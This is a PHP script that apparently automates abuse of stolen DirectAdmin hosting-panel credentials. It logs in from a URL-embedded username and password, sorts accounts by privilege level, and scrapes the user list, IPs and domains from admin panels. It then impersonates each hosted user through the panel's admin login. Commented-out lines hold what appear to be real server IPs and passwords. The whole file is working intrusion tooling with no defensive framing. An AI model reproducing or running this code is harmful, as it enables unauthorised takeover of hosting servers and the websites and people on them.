<?php

set_time_limit(0);
ini_set('max_execution_time', 0);

$mypid = getmypid();

$dir['script'] = pathinfo(__FILE__, PATHINFO_DIRNAME);
$dir['script'] = realpath($dir['script'] . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR);
$dir['includes'] = realpath($dir['script'] . DIRECTORY_SEPARATOR . 'includes' . DIRECTORY_SEPARATOR);
$dir['cache'] = realpath($dir['script'] . DIRECTORY_SEPARATOR . 'cache' . DIRECTORY_SEPARATOR);
$dir['modules'] = realpath($dir['script'] . DIRECTORY_SEPARATOR . 'modules' . DIRECTORY_SEPARATOR);
$dir['cur_logs'] = file_get_contents($dir['cache'] . DIRECTORY_SEPARATOR . 'cur_logs.txt');

file_put_contents($dir['script'] . DIRECTORY_SEPARATOR . 'cache' . DIRECTORY_SEPARATOR . 'imports' . DIRECTORY_SEPARATOR . $mypid, 1);

function createPassword($length) {
	$chars = '1234567890!#$abcdefghijkmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	$password = '';
	for($i = 0; $i < $length; $i++){
		$password .= @$chars[mt_rand(0, strlen($chars)-1)];
	}
	return $password;
}

ini_set('error_log', $dir['site'] . 'cache/panels.txt');
if(!function_exists('error_handler')){
	function error_import_handler($code, $msg, $file, $line){
		global $dir;
		if($code != 8) file_put_contents($dir['site'] . 'cache/panels.txt', print_r(array('code' => $code, 'msg' => $msg, 'file' => $file, 'line' => $line), true) . "\r\n", FILE_APPEND);
	}
	set_error_handler('error_import_handler');
}

//$site = base64_decode($_SERVER['argv'][1]);
//$site = 'http://193.105.174.69:2222/@@@admin:br5Ae3n';
$link = $site;

$site = explode("@@@", $site);
$site[0] = rtrim($site[0], '/');
$site[1] = explode(":", $site[1]);

/*
$site[0] = 'http://193.43.134.66:2222/';
$site[1][0] = 'reseller';
$site[1][1] = '123123123';

$site[1][0] = 'admin';
$site[1][1] = 'BqL6Y8AbTL';
$site[1][0] = 'test1';
$site[1][1] = '123321';
*/

require($dir['includes'] . '/curl.class.php');

$cookie = $dir['cache'] . DIRECTORY_SEPARATOR . md5($site[0] . time() . mt_rand(1000,99999)) . '.txt';

$http = new get_http();
$http->config['post'] = true;
$http->config['postFields'] = 'referer=%2F&username='.$site[1][0].'&password='.$site[1][1].'';
$http->config['cookieFileLocation'] = $cookie;
$http->config['followlocation'] = true;
$http->config['referer'] = $site[0] . '/CMD_LOGIN';
$http->open($site[0] . '/CMD_LOGIN');

if($http->status == 200 && !empty($http->webpage)){
	$name_html = md5($_SERVER['argv'][1] . time() . mt_rand(100,99999));
	file_put_contents($dir['cur_logs'] . '/errors/' . $name_html . '.html', print_r($http, true));

	if(stripos($http->webpage, 'DirectAdmin Login Page') === false){
		if(stripos($http->webpage, 'IMG_SKIN_CTRL_ACCESS') != false){
			if(stripos($http->webpage, '/CMD_ALL_USER_SHOW') != false){
				trigger_error('Admin Level', E_USER_NOTICE);

				$http->clear($cookie);
				$http->config['followlocation'] = false;
				$http->config['referer'] = $site[0];
				$http->open($site[0] . '/CMD_ALL_USER_SHOW');

				if($http->status == 200 && !empty($http->webpage)){
					preg_match_all('~<form name=tableform action=\'/CMD_SELECT_USERS\' method=\'GET\'>(.*)</form>~isU', $http->webpage, $match, PREG_SET_ORDER);

					if(count($match) == 1){
						preg_match_all('~<tr(.*)<\/tr~isU', $match[0][1], $match, PREG_SET_ORDER);

						if(count($match) > 0){
							foreach($match as $item){
								preg_match_all('~<td class=(list|list2)>(.*)<\/td~isU', $item[1], $match_line, PREG_SET_ORDER);

								if(count($match_line) == 8){
									if($match_line[4][2] != 'red'){
										$cpuser = strip_tags($match_line[0][2]);
										$ip = strip_tags($match_line[6][2]);

										$match_domain = explode('<br>', $match_line[7][2]);
                                        $domain = array();
                                        for($i = 0; $i < count($match_domain); $i++){
                                        	$match_domain[$i] = strip_tags($match_domain[$i]);
                                        	$match_domain[$i] = str_replace('&nbsp;', '', $match_domain[$i]);
                                        	$match_domain[$i] = str_replace(' ', '', $match_domain[$i]);
                                        	if(strpos($match_domain[$i], 'P:') === 0 || empty($match_domain[$i])){
                                        		//unset($match_domain[$i]);
                                        	}else{
                                        		$domain[] = $match_domain[$i];
                                        	}
                                        }
                                        unset($match_domain);

                                        file_put_contents($dir['cur_logs'] . '/errors_123.txt', print_r($domain, true) . "\r\n", FILE_APPEND);

										$cookie_sub = $dir['cache'] . DIRECTORY_SEPARATOR . md5($cpuser . $ip . time() . mt_rand(1000,99999)). '.txt';

										if(copy($cookie, $cookie_sub)){
											$http->clear($cookie_sub);
											$http->config['post'] = true;
											$http->config['postFields'] = 'username=admin%7C' . $cpuser;
											$http->config['referer'] = $site[0];
											$http->config['followlocation'] = false;
											$http->open($site[0] . '/CMD_LOGIN');

											if($http->status == 302){
												//hk
											}else{
												$name_html = md5($link. time().mt_rand(100,99999));
										    	file_put_contents($dir['cur_logs'] . '/errors_access_to_account.txt', $link . ' - (' . $cpuser . ') - html(' . $name_html . ")\r\n", FILE_APPEND);
										    	file_put_contents($dir['cur_logs'] . '/errors/'.$name_html.'.html',  print_r($http, true));
											}

											@unlink($cookie_sub);
										}
									}
								}else{
									//$name_html = md5($link. time().mt_rand(100,99999));
							    	//file_put_contents($dir['cur_logs'] . '/errors_get_list_accounts.txt', $link . ' - ' . count($match_line) . ' - html(' . $name_html . ")\r\n", FILE_APPEND);
							    	//file_put_contents($dir['cur_logs'] . '/errors/'.$name_html.'.html',  print_r($http, true));
								}
							}
						}else{
							//$name_html = md5($link. time().mt_rand(100,99999));
					    	//file_put_contents($dir['cur_logs'] . '/errors_get_list_accounts.txt', $link . ' - html(' . $name_html . ")\r\n", FILE_APPEND);
					    	//file_put_contents($dir['cur_logs'] . '/errors/'.$name_html.'.html',  print_r($http, true));
						}
					}else{
						$name_html = md5($link. time().mt_rand(100,99999));
				    	file_put_contents($dir['cur_logs'] . '/errors_get_list_accounts.txt', $link . ' - html(' . $name_html . ")\r\n", FILE_APPEND);
				    	file_put_contents($dir['cur_logs'] . '/errors/'.$name_html.'.html',  print_r($http, true));
					}
				}else{
					$name_html = md5($link. time().mt_rand(100,99999));
			    	file_put_contents($dir['cur_logs'] . '/errors_get_list_accounts.txt', $link . ' - html(' . $name_html . ")\r\n", FILE_APPEND);
			    	file_put_contents($dir['cur_logs'] . '/errors/'.$name_html.'.html',  print_r($http, true));
				}
			}elseif(stripos($http->webpage, '/CMD_USER_SHOW') != false){
				trigger_error('Reseller Level', E_USER_NOTICE);
			}
		}else{
			trigger_error('User Level', E_USER_NOTICE);
		}
    }else{
    	file_put_contents($dir['cur_logs'] . '/errors_autorize.txt', $link . "\r\n", FILE_APPEND);
    }
}else{
	file_put_contents($dir['cur_logs'] . '/errors_autorize.txt', $link . "\r\n", FILE_APPEND);
}

@unlink($cookie);
@unlink($dir['script'] . DIRECTORY_SEPARATOR . 'cache' . DIRECTORY_SEPARATOR . 'imports' . DIRECTORY_SEPARATOR . $mypid);

?>